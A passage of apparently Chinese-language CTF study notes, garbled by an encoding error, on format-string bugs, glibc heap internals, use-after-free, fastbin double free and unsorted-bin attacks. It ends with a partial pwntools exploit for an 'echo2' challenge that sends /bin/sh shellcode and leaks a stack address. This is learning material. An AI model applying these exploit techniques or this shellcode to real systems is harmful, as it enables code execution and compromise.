åœ°å€å³å¯ï¼ˆprintfï¼ˆâ€%100$dâ€,a,b,cï¼‰ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p><pre><code class="c">#include&lt;stdio.h&gt;int main()&#123;int a = 1;int b = 2;int c = 3;printf(&quot;%3$d&quot;,a,b,c);//æ‰“å°å‡º3  $n---&gt;æ‰“å°å‡ºç¬¬å‡ ä¸ªå‚æ•°return 0;&#125;</code></pre><p>%d â€”-&gt;æ‰“å°æœ‰ç¬¦å·æ•´å‹  -140â€¦.å¯¹åº”0xfï¼ˆè¦ä¹ˆä¸ºåŠ¨æ€é“¾æ¥åº“ä¸­åœ°å€ è¦ä¹ˆä¸ºæ ˆä¸Šåœ°å€ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p><p>é€å‚æ‰“å°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p><p>%nâ€”-&gt;è§£æåœ°å€å¯¹åº”å†…å®¹ â€”-å†™å…¥å‰æ–¹å·²ç»æ‰“å°æˆåŠŸçš„å­—ç¬¦ä¸ªæ•°ï¼ˆä»»æ„åœ°å€å†™ï¼‰<br>%n å†™å…¥4å­—èŠ‚0x00000004<br>%hnå†™å…¥ä¸¤å­—èŠ‚0x0004<br>%hhnå†™å…¥ä¸€å­—èŠ‚0x04<br>printfçš„ç¬¬n+1ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬nä¸ªå‚æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p><p>0x0b &#x3D; 11ä¹Ÿå¯ä»¥è¯´æ˜ä¸ºç¬¬åä¸€ä¸ªå‚æ•°<br>ç©ºè¡Œéƒ¨åˆ†ç›¸å½“äºå¯¹å¡«å…¥æ•°æ®çš„æ‰“å°<br>å…³é”®ï¼šæ‰¾readå‡½æ•°åˆ¤æ–­å†™å…¥æ•°æ®ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬å‡ ä¸ªå‚æ•°<br>x86å¯ä»¥ç›´æ¥æ•° x64å‰6ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨ä¸­ç¬¬7ä¸ªæ‰åœ¨æ ˆä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p><p>x64ç›´æ¥åˆ©ç”¨æ‰¾å‚æ•°ä½ç½® å¯æš´åŠ›æ‰“å°%7$p%8$p%9$p(ä»…ä¸ºä¸¾ä¾‹)<br>å‰6ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨ä¸­ rspä¸ºç¬¬7ä¸ªâ€”&gt;å¯¹åº”n+1printfï¼ˆflagï¼‰å’Œnæ ¼å¼åŒ–å­—ç¬¦ä¸²å…³ç³»æ‰¾åˆ°ä½ç½®</p><p><strong>å †</strong><br>ä½œç”¨ï¼šç»™ç”¨æˆ·éšæ—¶æä¾›å¯ä½¿ç”¨çš„å†…å­˜ ç”¨å®Œåå½’è¿˜</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p><p>å †ç®¡ç†å™¨â€”&gt;ä¸­é—´äºº</p><p>å †ç®¡ç†å™¨å¹¶éç”±æ“ä½œç³»ç»Ÿå®ç°,è€Œæ˜¯ç”±libc.so.6é“¾æ¥åº“å®ç°ã€‚å°è£…äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¹ä¸ºç”¨æˆ·æä¾›æ–¹ä¾¿çš„åŠ¨æ€å†…å­˜åˆ†é…æ¥å£çš„åŒæ—¶ï¹åŠ›æ±‚é«˜æ•ˆåœ°ç®¡ç†ç”±ç³»ç»Ÿè°ƒç”¨ç”³è¯·æ¥çš„å†…å­˜ã€‚</p><p>ç”³è¯·å†…å­˜ç³»ç»Ÿè°ƒç”¨ï¼š<br>brkï¼ˆdataæ®µæœ«å°¾å‘ä¸Šæ‰©å±•è°ƒç”¨ï¼‰ä¸»çº¿ç¨‹ç³»ç»Ÿè°ƒç”¨<br>mmapï¼ˆå†…å­˜&#x2F;ç£ç›˜æ˜ å°„ï¼‰</p><p>å†³å®šè¦ç´ ï¼šä¸»çº¿ç¨‹brkå’Œmmapéƒ½å¯ç”¨<br>                   å­çº¿ç¨‹åªå¯ç”¨mmap<br>å­çº¿ç¨‹ç”³è¯·ç©ºé—´è¿‡å¤§åœ¨mmapæ®µæ˜ å°„ å°å¯ç›´æ¥åœ¨dataæ®µå¼€è¾Ÿ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p><p>mallocç”¨æˆ·å‘å †ç®¡ç†å™¨è¦å†…å­˜ brkå’Œmmapå‘æ“ä½œç³»ç»Ÿç”³è¯·</p><p><strong>arena</strong>ï¼ˆå°†ç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´å­˜å‚¨ç®¡ç†ï¼‰<br>å†…å­˜åˆ†é…åŒºï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p><pre><code>æ“ä½œç³»ç»Ÿ--&gt;å †ç®¡ç†å™¨--&gt;ç”¨æˆ·ç‰©ç†å†…å­˜--&gt;arena--&gt;å¯ç”¨å†…å­˜</code></pre><p>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„å†…å­˜äº¤æ˜“å‘ç”Ÿäºarenaä¸­ï¼ˆå †ç®¡ç†å™¨å‘æ“ä½œç³»ç»Ÿæ‰¹å‘æ¥çš„æœ‰å†—ä½™çš„å†…å­˜åº“ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p><p><strong>chunk</strong>ï¼ˆå†…å­˜åˆ†é…çš„æœ€å°å•ä½ ä¸å¯èƒ½å°äº8å­—èŠ‚ã€ä¸¤å­—é•¿16å­—èŠ‚ï¼ˆx64ï¼‰ã€‘x32å¤§å°ï¼‰<br>ç”¨æˆ·ç”³è¯·å†…å­˜çš„å•ä½ï¼Œä¹Ÿæ˜¯å †ç®¡ç†å™¨ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½<br>mallocï¼ˆï¼‰è¿”å›çš„æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸ chunkå¤§å° å¤§äºmallocåˆ†é…å¤§å°<br>chunkåˆ†é…è§„å¾‹ï¼šåªèƒ½åˆ†é…å­—é•¿æ•´æ•°å€å¤§å°â€”&gt;sizeä½ä¸‰ä½ä¸€å®šä¸º0</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p><p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p><p>æ³¨æ„åœ¨sizeä½ä¸‰ä½æœ‰ä¸‰ä¸ªæ§åˆ¶å­—æ®µ<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p><p>Aï¼šä¸»çº¿ç¨‹ Mï¼šæ˜¯å¦ä¸ºmmap Pï¼šç”¨äºfree chunkï¼ˆä¸º1â€“&gt;å‰ä¸€ä¸ªchunkè¢«å†™å…¥æ•°æ®å³å‰ä¸€ä¸ªchunkä¸ºmalloc chunk ä¸º0åˆ™å‰ä¸€ä¸ªchunkä¸ºfree chunkï¼‰1â€“&gt;å‰ä¸€ä¸ªchunkè¢«å ç”¨ 0â€“&gt;å‰ä¸€ä¸ªchunk pre-in-use</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p><p>fastbin free chunk å››å­—æ®µæ§åˆ¶ç»“æ„ smallbin free chunk å››å­—æ®µæ§åˆ¶ç»“æ„<br>bigbin free chunk å…­å­—æ®µæ§åˆ¶ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p><p>fast binsç‹¬ç«‹äºå…¶ä»–å‡ ä¸ªbins å‹æ ˆå‡ºæ ˆå³å¯<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p><p>large bin free chunk 6ä¸ªå­—æ®µå…¨éƒ¨ç”¨åˆ°<br>malloc chunk ç”¨å‰ä¸¤ä¸ª<br>malloc chunkå‰é¢è¿˜æ˜¯malloc chunkæ—¶åªç”¨åˆ°ç¬¬äºŒä¸ªå­—æ®µ<br>small bin free chunk allocated chunkç”¨å‰4ä¸ªå­—æ®µ<br>fast bin free chunk ç”¨å‰3ä¸ªå­—æ®µ<br>ç»è¿‡ç¬¬ä¸€æ¬¡mallocåå †ç®¡ç†å™¨æ‰å®Œæˆåˆå§‹åŒ–<br>é¡µå¯¹é½ é¡µçš„å¤§å°æ˜¯4kb 4kbéœ€è¦2^12æ˜ å°„ç©ºé—´ 12bitsä¸º3byteså˜æˆ3ä¸ª0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p><p>x64æœ€ä¸‹chunkå•ä½ï¼ˆ0x20å¤§å°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p><p>x86 åŒç†å¾—æœ€å°å¤§å°ä¸º0x10ï¼ˆåˆ‡ä¸€åŠï¼‰<br>æ§åˆ¶å­—æ®µä¸å¯å¡«å†™ å †ç®¡ç†å™¨æ»¡è¶³ç”¨æˆ·éœ€æ±‚å‘æ“ä½œç³»ç»Ÿç”³è¯·0x100å¤§å°å®é™…ç”³è¯·chunkå¤§å°ä¸º0x110ï¼ˆpre size+size ä¸¤å­—é•¿ 16bits 0x10å¤§å°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;void *ptr = malloc(0x100);free(ptr);&#125;</code></pre><p>mallocå¾—åˆ°çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘size ï¼ˆå›¾ä¸­ï¼‰ä½†chunkå¼€å¤´çš„åœ°å€æ˜¯</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p><p>å…¶ä»–chunkä¸ºç¨‹åºè‡ªèº«åˆ©ç”¨ç¼“å†²åŒºæä¾›ï¼ˆå¦‚ï¼šprintfå‡½æ•° ã€æœªæŒ‡å®šstdoutç¼“å†²åŒºæ—¶ printfå‡½æ•°é»˜è®¤ç”¨mallocå¾—åˆ°ä¸€ä¸ªå †ä¸­çš„ç¼“å†²åŒºä¸ºstdoutæ‰€ç”¨ã€‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p><p>ç¨‹åºè¯»å–æ—¶ä»¥ä¸€æ¡è¯­å¥ä¸ºå•ä½ sizeå¤§å°ä¸ºç”³è¯·çš„0x100+prev size+sizeï¼ˆä¸¤å­—é•¿ï¼‰æ­¤æ—¶på·²è¢«ç¨‹åºå‘˜å¤ç”¨ å³æ­¤æ—¶æ€»sizeå¤§å°ï¼ˆæ€»chunkå¤§å° 0x100ä¸ºmalloc chunkå¤§å°ï¼‰ä¸º0x111</p><p><strong>previous sizeå¤ç”¨</strong><br>prev sizeé’ˆå¯¹free chunk å³å­˜å‚¨ä¸Šä¸€ä¸ªfree chunk<br>å½“ä¸Šä¸€ä¸ªchunkä¸ä¸ºfastbin free chunkæ—¶ï¼ˆä¸ºmalloc chunkï¼‰prev chunkå¯è¢«å¤ç”¨<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p><p>ä»¥ä¸Šå˜åŒ–chunkå˜åŒ–ç›¸åŒ 8å­—èŠ‚ç”³è¯·çš„å¤§å°ä¸ºå­—é•¿å¥‡æ•°å€åˆ†é…ç©ºé—´&#x3D;ç”³è¯·åˆ°çš„å­—é•¿æ•°-1mallocåˆ†é…ç©ºé—´å¤§å°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p><p>0x100æ•°æ®åŒºåŸŸçš„å¤§å° 0x10ä¸ºæ§åˆ¶å­—æ®µçš„å¤§å° 1 prev in use ä½å¤§å°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p><p>æ”¾åœ¨fast bin ä¸­çš„free chunkä»ä¼šè¢«æ ‡è®°ä¸ºåœ¨ä½¿ç”¨ä¸­ï¼ˆfast bin pä½æ’ä¸º1ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p><p><strong>ç‰©ç†é“¾è¡¨</strong>ã€ç›¸é‚»chunké—´sizeåŸŸè¿æ¥ï¼ˆæ•´æ•°ï¼‰ã€‘</p><p>é€šè¿‡prev sizeä¸²è”èµ·æ¥ï¼ˆè·å–å‰ä¸€ä¸ªchunkåœ°å€ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p><p><strong>é€»è¾‘é“¾è¡¨</strong>ï¼ˆå­˜åœ¨äºbinsä¸­ï¼‰ã€æŒ‡é’ˆè¿æ¥ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p><p>æ¯ä¸€ä¸ªbinéƒ½å«æœ‰å¯¹åº”çš„é“¾è¡¨ æ„æˆçš„binsé“¾è¡¨ç§°ä¸ºé€»è¾‘é“¾è¡¨<br>åŒç±»chunkä¸²è”åˆ°å›æ”¶ç«™ä¸­ mallocç´¢å–ç›¸åº”å¤§å°æ—¶å¯é«˜æ•ˆä»å›æ”¶ç«™ä¸­æå–</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p><p><strong>bin</strong><br>ï¼ˆä¸´æ—¶ã€ç³»ç»Ÿéœ€è¦æ—¶å¯ç”¨ã€‘ï¼‰ä¿å­˜åˆšè¢«freeåå†…å­˜åŒºåŸŸçš„ç»“æ„ï¼ˆå †ç®¡ç†å™¨ä¸­ï¼‰<br>ç®¡ç†arenaä¸­ç©ºé—²chunkçš„ç»“æ„<br>ä»¥æ•°ç»„çš„å½¢å¼å­˜åœ¨ æ•°ç»„å…ƒç´ ä¸ºç›¸åº”å¤§å°çš„chunké“¾è¡¨çš„é“¾è¡¨å¤´<br>å­˜åœ¨äºarenaçš„malloc_stateä¸­<br>å¦‚ï¼š<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>é™¤fast binå’Œtcacheä¸ºå•å‘é“¾è¡¨ å…¶ä½™binså‡ä¸ºåŒå‘é“¾è¡¨</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebinåŒå‘é“¾è¡¨ç»“æ„binåˆ©ç”¨:<br>ğŸ¤–mallocåˆ†é…æ—¶<br>ğŸ°è·å–å¾ˆå¤§chunkæ—¶ä¼˜å…ˆä»å›æ”¶ç«™ä¸­æ‹¿å– unsorted binså˜ä¸ºsorted binsä½¿ç”¨<br>åŒå‘é“¾æ¥ï¼šå…ˆè¿›å…ˆå‡ºï¼ˆå›¾ä¸Šè‡ªä¸Šè€Œä¸‹mallocï¼‰<br>å¥½å¤„ï¼šé˜Ÿåˆ—åº•éƒ¨å‹å…¥æ•°æ® å¤´éƒ¨å–å‡ºæ•°æ® ä¸€æ¡é“¾è¡¨å°±å¯å¤„ç†æ•°æ®<br>small binï¼ˆå¤§å°å›ºå®šï¼‰<br>ä¸€ä¸ªbinå­˜å‚¨ä¸¤ä¸ªåœ°å€ ç‰©ç†å†…å­˜ä¸­è¿ç»­ æŠŠæ‰€æœ‰chunkä¸²è”</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large binsï¼ˆå¤§å°ä¸å®šã€æ¯ä¸€chunkå¤§å°ä¸ä¸€ã€‘ æœ€åä¸€ä¸ªchunkå­˜å‚¨æœ€åå€¼ï¼‰<br>å¤§å°ä¸ºèŒƒå›´ â€”&gt;ç”¨ä¸¤ä¸ªé¢å¤–çš„æ§åˆ¶åŸŸè®°å½•æ•°æ®<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p><p>fast binså¯å˜ä¸ºsmall binsï¼ˆfast binæ•´ä½“éå†æ£€æŸ¥æ—¶åˆ†ç±»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p><p>BK POINTER åŸŸæ— å®é™…ä½œç”¨<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p><p> malloc stateï¼ˆfastbinsY+binsï¼‰åœ¨libcæ•°æ®æ®µç®¡ç†ä¸»è¿›ç¨‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p><p><strong>ä»€ä¹ˆæ ·çš„chunkä¼šè¿›å…¥usorted bins</strong><br>åˆšåˆšé‡Šæ”¾ï¼ˆè¶…è¿‡fastbinå¤§å°ï¼‰ä¸èƒ½è¿›å…¥fastbinsä¸”æœªè¢«åˆ†ç±»çš„</p><p>è¶…å‡ºfastbinså¯ç”¨å¤§å°åˆ©ç”¨è¿‡ç¨‹ï¼šunsortedå…ˆä¹è®¨ åˆå¹¶é“¾æ¥å‡‘å¤§å° small largeä¸€èµ·æ¥ å®åœ¨ä¸å¤Ÿå–Štop<br>å…ˆæ‰¾sortedbins ä¸å¤Ÿè§¦å‘sortedéå† åˆå¹¶unsortedç›¸é‚»chunkå¹¶åˆ†ç±»<br>å³åˆ©ç”¨æ—¶åªè¦æ‰¾åˆ°æ¯”ç”¨æˆ·ç”³è¯·å¤§çš„chunkå³å¯ å‰©ä½™éƒ¨åˆ†ä¸ºlast  remainder chunkè½¬ä¸ºfastbinéƒ¨åˆ†æœ€åè¿›å…¥unsorted bins</p><p><strong>UAF</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p><p>A freeåçš„å†…å­˜åŒº</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p><p>åœ¨ree chunkå’Œtop chunkå¼ æ”¾ä¸€ä¸ªmalloc chunké˜»æ­¢ä¸¤è€…åˆå¹¶ï¼ˆé¿å…å †ç®¡ç†å™¨çš„æ¶ˆè€—ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p><p>cåˆ†é…åˆ°aæ‰€åœ¨çš„å†…å­˜åŒºåŸŸä¸­ å ç”¨åˆ©ç”¨</p><p>gdbåç§»ä¸‹æ–­ç‚¹æ–¹æ³•</p><pre><code>b *$rebase(0x..)ã€åç§»ã€‘</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p><p>ç¬¬å››æ¬¡mallocåå¾—åˆ°æ ˆä¸Šåœ°å€ï¼ˆå †åˆ†é…ï¼‰</p><p>free aå<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p><p>é˜²æ­¢double freeæ¼æ´ï¼ˆUAFï¼‰ï¼šæ§åˆ¶å†…å­˜çš„æŒ‡é’ˆå’Œå†…å­˜å‡éœ€æ¸…ç©º ï¼ˆchunkè¢«æ¸…ç©ºä½†æŒ‡é’ˆæœªæ¸…ç©ºï¼‰<br>æ„å¤–ï¼šä½æƒé™æŒ‡é’ˆå¯å› ä½¿ç”¨åŒä¸€å—å†…å­˜åŒºåŸŸæ‹¥æœ‰é«˜æƒé™æŒ‡é’ˆåŠŸèƒ½ï¼ˆè‹¥ä½æƒé™æŒ‡é’ˆç¯¡æ”¹è¿”å›å€¼é«˜æƒé™æŒ‡é’ˆä¼šæ— æ„è¯†ä¼ é€åˆ°pieä¸­ï¼‰</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int * p = malloc(16); free(p); free(p); return 0;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p><p>tipsï¼š<br>1.glibc2.26&#x2F;2.27ä¸­æ— tacheæ£€æŸ¥<br>2.fast binä¼šæ£€æŸ¥è‡ªèº«é“¾è¡¨ä¸­æ¯ä¸€ä¸ªchunkå¤§å°æ˜¯å¦ä¸ºè§„å®šå¤§å°||æ–°è¿›å…¥çš„chunkæ˜¯å¦ä¸ä¸Šä¸€ä¸ªchunké‡å¤ï¼ˆæŠ¥double free å¼ºåˆ¶é€€å‡ºï¼‰</p><p>ç»•è¿‡ï¼š</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int* p = malloc(16); malloc(16); int* ptr = malloc(16); free(p); free(ptr); free(p); return 0;&#125;</code></pre><p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p><p>freeåfdå‡ºç° æ­¤æ—¶æ­¤å—chunkå¯¹äºdæ¥è¯´ä¸ºmalloc chunkå¯è¢«ä»»æ„å†™å…¥å€¼ï¼ˆfdå¤„ï¼‰<br>fdå†™å…¥ä¸€ä¸ªstackå€¼ è¯ˆéª—fast binè¿‡aåä¸‹ä¸€ä¸ªfree chunkåœ¨æ ˆä¸Š ã€ä»»æ„éœéœå®ç°ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>æ³¨æ„ï¼šfdå§‹ç»ˆæŒ‡å‘ä¸‹ä¸€ä¸ªchunkå¼€å¤´åœ°å€ å³stackå¯¹åº”æ ˆä¸Šç›®æ ‡åœ°å€å‘ä¸Šä¸¤ä¸ªå­—é•¿</p><p><strong>unsorted_bin_attcak</strong><br>å¯ä»¥æŠŠä»»æ„ä½ç½®çš„åœ°å€ç¯¡æ”¹æˆè¾ƒå¤§çš„å€¼ï¼ˆå®é™…å°±æ˜¯ä¼ªé€ chunkåœ¨æ ˆä¸Šå†™ä¸€ä¸ªå¤§æ•°å€¼ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p><p>ç¨‹åºç›®æ ‡å°†varç¯¡æ”¹ä¸ºè¾ƒå¤§å€¼<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p><p>unlinkç§»é™¤ä¸­é—´çš„chunk  æ–°fdå’Œbkä¸­å¡«å…¥unsorted binä¸­å€¼ï¼ˆfdå’Œbkæ•°æ®åŸŸå†™å…¥unsorted åœ°å€ï¼‰æœ€å¤§0x7ffâ€¦<br><strong>house_ofç³»åˆ—</strong><br>mallocæ€»æ˜¯æ¥æ”¶ä¸€ä¸ªæ— ç¬¦å·æ•´æ•° è¾“å…¥è´Ÿæ•°ç›¸å½“äºä¼ å…¥ä¸€ä¸ªè¶…å¤§æ•°<br>æ•´æ•°æº¢å‡ºï¼ˆè¶…å¤§æ•´æ•°ç­‰æ•ˆäºä¸€ä¸ªè´Ÿæ•°ï¼‰<br>top chunkèµ·å§‹åœ°å€ + mallocåˆ†é…ç©ºé—´è¶…å‡ºæ•´æ•°å†…å­˜ç©ºé—´å¤§å°â€“ä¸¢å¼ƒè¶…å‡º32ä½éƒ¨åˆ†ï¼ˆæœ€é«˜ä½ï¼‰è¡¥0 å‰©ä¸‹æ•°å­—å˜å¾ˆå°ï¼ˆ32ä½è¡¨ç¤ºç©ºé—´å¤§å°ï¼‰</p><p>æ­¤æ—¶è¿™ä¸ªå¾ˆå°çš„æ•°å¾ˆå¯èƒ½è½åœ¨dataå¤„ï¼ˆï¼Ÿï¼‰</p><p><strong>FSB&amp;USFä¾‹é¢˜</strong><br>(1)IDAè§‚å¯Ÿ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p><p>scanfå‘v7ã€v8ã€v9å†™å­—ç¬¦ä¸²ï¼ˆå¼€è¾Ÿçš„ç©ºé—´æ˜¯è¿ç»­çš„ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p><p>è¿ç»­çš„ä¸‰ä¸ªå­—é•¿ç¼“å†²åŒº<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">å‘ç°ç¨‹åºæ ‡è®°æç¤ºè¿›å…¥å¯¹åº”æ¼æ´æŸ¥çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" alt="image-20230620155817628"></p><p>freeï¼ˆsï¼‰æ¸…ç©ºäº†å†…å­˜ä½†æŒ‡é’ˆæœªé”€æ¯ä½†éšç€echo3æ‰§è¡Œå®Œæ¯•å¯¹åº”sæ ˆå¸§é”€æ¯æ•…æ— å½±å“ ä½† cleanupï¼ˆï¼‰å‡½æ•°freeï¼ˆ0ï¼‰å¯¹åº”uaf å³oå†…å­˜è¢«æ¸…ç©ºä½†æŒ‡é’ˆæœªè¢«é”€æ¯ æ­¤æ—¶å†ç”¨å¦ä¸€æŒ‡é’ˆä¸oæŒ‡å‘åŒä¸€å†…å­˜ç©ºé—´å³å¯è·å–ä¸»åŠ¨æƒ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">å— </p><p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p><p>echo3freeåsä½¿ç”¨çš„ç©ºé—´æœ€åè¿˜æ˜¯ç•™åœ¨å¯¹åº”å¾—4å­—é•¿chunkä¸­  oæœ€åä¸€ä¸ªå‚æ•°å†™å…¥shellcodeï¼ˆgreetingï¼‰ é¦–åœ°å€ä½œä¸ºå‚æ•°è¿›è¡Œä¼ å‚</p><pre><code class="python">from pwn import *p=process(&quot;./echo2&quot;)elf=ELF(&quot;./echo2&quot;)p.recvuntil(&quot;hey, what&#39;s your name? : &quot;)shellcode=b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;p.sendline(shellcode)p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;2&quot;)payload=b&quot;%10$p&quot;+b&quot;A&quot;*3 #Aç”¨ä½œæ ‡è®°p.sendline(payload)p.recvuntil(b&quot;0x&quot;)shellcode_addr=int(p.recvuntil(b&#39;AAA&#39;,drop=True),16)-0x20p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;4&quot;)p.recvuntil(b&quot;to exit? (y/n)&quot;)p.sendline(b&quot;n&quot;)p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;hello 